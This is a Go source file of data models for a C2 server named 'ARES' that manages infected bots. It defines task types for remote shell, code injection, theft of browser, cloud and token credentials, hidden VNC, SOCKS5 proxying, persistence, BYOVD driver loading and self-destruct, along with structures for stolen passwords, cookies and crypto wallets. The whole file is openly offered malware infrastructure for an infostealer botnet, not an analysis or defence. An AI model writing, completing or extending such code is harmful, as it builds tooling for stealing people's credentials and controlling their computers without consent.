/*
 * ═══════════════════════════════════════════════════════════════
 *  ARES C2 SERVER — Data Models
 *  Shared structures for bot management, tasking, and relay.
 * ═══════════════════════════════════════════════════════════════
 */

package models

import (
	"encoding/json"
	"os"
	"sync"
	"time"
)

// Bot represents a connected agent/implant
type Bot struct {
	ID         string    `json:"id"`
	Hostname   string    `json:"hostname"`
	Username   string    `json:"username"`
	Domain     string    `json:"domain"`
	OS         string    `json:"os"`
	Arch       string    `json:"arch"`
	PID        int       `json:"pid"`
	HWID       string    `json:"hwid"`
	ExternalIP string    `json:"external_ip"`
	Country    string    `json:"country"`
	FirstSeen  time.Time `json:"first_seen"`
	LastSeen   time.Time `json:"last_seen"`
	Elevated   bool      `json:"elevated"`
	Status     string    `json:"status"` // "active", "sleeping", "dead"

	// Capabilities
	Socks5Active bool `json:"socks5_active"`
	HVNCActive   bool `json:"hvnc_active"`

	// Task queue
	PendingTasks []Task `json:"-"`
	mu           sync.Mutex
	// v5.0 FIX H-19: Field-level mutex for concurrent LastSeen/Status updates
	fieldMu      sync.RWMutex `json:"-"`
}

func (b *Bot) AddTask(t Task) {
	b.mu.Lock()
	defer b.mu.Unlock()
	b.PendingTasks = append(b.PendingTasks, t)
}

func (b *Bot) PopTasks() []Task {
	b.mu.Lock()
	defer b.mu.Unlock()
	tasks := b.PendingTasks
	b.PendingTasks = nil
	return tasks
}

// v5.0 FIX H-19: Thread-safe setters for fields accessed concurrently
func (b *Bot) SetLastSeen(t time.Time) {
	b.fieldMu.Lock()
	b.LastSeen = t
	b.fieldMu.Unlock()
}

func (b *Bot) SetStatus(s string) {
	b.fieldMu.Lock()
	b.Status = s
	b.fieldMu.Unlock()
}

func (b *Bot) GetLastSeen() time.Time {
	b.fieldMu.RLock()
	defer b.fieldMu.RUnlock()
	return b.LastSeen
}

func (b *Bot) GetStatus() string {
	b.fieldMu.RLock()
	defer b.fieldMu.RUnlock()
	return b.Status
}

// TaskType enumerates all C2 commands
type TaskType int

const (
	TaskNOP TaskType = iota
	TaskShell
	TaskDownload
	TaskUpload
	TaskInject
	TaskStealBrowser
	TaskStealCloud
	TaskStealTokens
	TaskScreenshot
	TaskSocks5Start
	TaskSocks5Stop
	TaskHVNCStart
	TaskHVNCStop
	TaskPersist
	TaskMigrate
	TaskSleep
	TaskSelfDestruct
	TaskLoadModule
	TaskBYOVDLoad
	TaskFirmwareRecon
	TaskUnhook
)

// Task represents a command to send to a bot
type Task struct {
	ID        string   `json:"id"`
	Type      TaskType `json:"type"`
	Args      []string `json:"args,omitempty"`
	Data      []byte   `json:"data,omitempty"`
	DelayMs   int      `json:"delay_ms,omitempty"` // v4.4: ms to wait before executing this task
	CreatedAt time.Time `json:"created_at"`
}

// TaskResult is the bot's response to a task
type TaskResult struct {
	TaskID    string    `json:"task_id"`
	BotID     string    `json:"bot_id"`
	TaskType  TaskType  `json:"task_type,omitempty"`
	Success   bool      `json:"success"`
	Output    string    `json:"output,omitempty"`    // Plain text — agent sends strings, not []byte
	Error     string    `json:"error,omitempty"`
	Timestamp time.Time `json:"timestamp,omitempty"`
}

// StolenData represents exfiltrated credential data
type StolenData struct {
	BotID     string          `json:"bot_id"`
	Timestamp time.Time       `json:"timestamp"`
	Type      string          `json:"type"` // "passwords", "cookies", "wallets", "cloud", "bof_result", "byovd"
	Count     int             `json:"count,omitempty"`
	Entries   []Credential    `json:"entries,omitempty"`
	RawJSON   json.RawMessage `json:"-"` // Preserved raw data for non-standard formats
}

type Credential struct {
	// Common fields
	Type      string `json:"type,omitempty"`      // "password", "cookie", "token", "secret"
	URL       string `json:"url,omitempty"`
	Username  string `json:"username,omitempty"`
	User      string `json:"user,omitempty"`       // Alias for username (agent uses "user")
	Value     string `json:"value,omitempty"`
	Pass      string `json:"pass,omitempty"`       // Alias for value (agent uses "pass")
	Browser   string `json:"browser,omitempty"`
	Profile   string `json:"profile,omitempty"`
	Decrypted bool   `json:"decrypted,omitempty"`
	Status    string `json:"status,omitempty"` // "ok", "v20_blocked", "dpapi_fail", "aes_fail"

	// Cookie-specific fields
	Host     string `json:"host,omitempty"`
	Name     string `json:"name,omitempty"`
	Path     string `json:"path,omitempty"`
	Secure   int    `json:"secure,omitempty"`
	HttpOnly int    `json:"httponly,omitempty"`

	// Wallet-specific fields
	Extension string `json:"ext,omitempty"`
	DataLen   int    `json:"data_len,omitempty"`
}

// Socks5Session tracks active SOCKS5 proxy tunnels
type Socks5Session struct {
	BotID       string    `json:"bot_id"`
	LocalPort   int       `json:"local_port"`
	BytesIn     int64     `json:"bytes_in"`
	BytesOut    int64     `json:"bytes_out"`
	Connections int       `json:"connections"`
	StartedAt   time.Time `json:"started_at"`
	Active      bool      `json:"active"`
}

// HVNCSession tracks active hVNC sessions
type HVNCSession struct {
	BotID      string    `json:"bot_id"`
	DesktopName string   `json:"desktop_name"`
	Width      int       `json:"width"`
	Height     int       `json:"height"`
	StartedAt  time.Time `json:"started_at"`
	Active     bool      `json:"active"`
}

// Listener configuration for C2 endpoints
type Listener struct {
	ID       string `json:"id"`
	Type     string `json:"type"` // "http", "https", "tcp", "smb"
	BindAddr string `json:"bind_addr"`
	BindPort int    `json:"bind_port"`
	Active   bool   `json:"active"`
}

// BotStore is the database of all managed bots (v3.9: file-backed persistence)
type BotStore struct {
	bots     map[string]*Bot
	mu       sync.RWMutex
	savePath string // path to bots.json for persistence
}

func NewBotStore() *BotStore {
	return &BotStore{bots: make(map[string]*Bot), savePath: "data/bots.json"}
}

func (s *BotStore) Register(bot *Bot) {
	s.mu.Lock()
	defer s.mu.Unlock()
	s.bots[bot.ID] = bot
	s.saveLocked()
}

func (s *BotStore) Get(id string) *Bot {
	s.mu.RLock()
	defer s.mu.RUnlock()
	return s.bots[id]
}

// v5.0 FIX H-20: List() returns pointers for performance.
// IMPORTANT: Callers should use SetLastSeen()/SetStatus() for thread-safe mutations.
func (s *BotStore) List() []*Bot {
	s.mu.RLock()
	defer s.mu.RUnlock()
	list := make([]*Bot, 0, len(s.bots))
	for _, b := range s.bots {
		list = append(list, b)
	}
	return list
}

func (s *BotStore) Remove(id string) {
	s.mu.Lock()
	defer s.mu.Unlock()
	delete(s.bots, id)
	s.saveLocked()
}

func (s *BotStore) Count() int {
	s.mu.RLock()
	defer s.mu.RUnlock()
	return len(s.bots)
}

// v3.9: Save all bots to disk (called with lock held)
// v5.0 FIX M-7: Strict file permissions (0600) to protect bot metadata
func (s *BotStore) saveLocked() {
	// Serialize bots to JSON
	type persistBot struct {
		Bot
	}
	bots := make([]persistBot, 0, len(s.bots))
	for _, b := range s.bots {
		bots = append(bots, persistBot{Bot: *b})
	}
	data, err := json.MarshalIndent(bots, "", "  ")
	if err != nil {
		return
	}
	// Ensure directory exists with restricted permissions
	dir := "data"
	if idx := len(s.savePath) - len("bots.json") - 1; idx > 0 {
		dir = s.savePath[:idx]
	}
	os.MkdirAll(dir, 0700)
	// Atomic write: write to temp, then rename — use 0600 permissions
	tmp := s.savePath + ".tmp"
	if err := os.WriteFile(tmp, data, 0600); err != nil {
		return
	}
	os.Rename(tmp, s.savePath)
	// Ensure final file has correct permissions
	os.Chmod(s.savePath, 0600)
}

// v3.9: Load bots from disk on startup
func (s *BotStore) LoadFromDisk() int {
	s.mu.Lock()
	defer s.mu.Unlock()
	data, err := os.ReadFile(s.savePath)
	if err != nil {
		return 0
	}
	var bots []Bot
	if err := json.Unmarshal(data, &bots); err != nil {
		return 0
	}
	for i := range bots {
		bots[i].Status = "sleeping" // Mark as sleeping until they beacon
		s.bots[bots[i].ID] = &bots[i]
	}
	return len(bots)
}
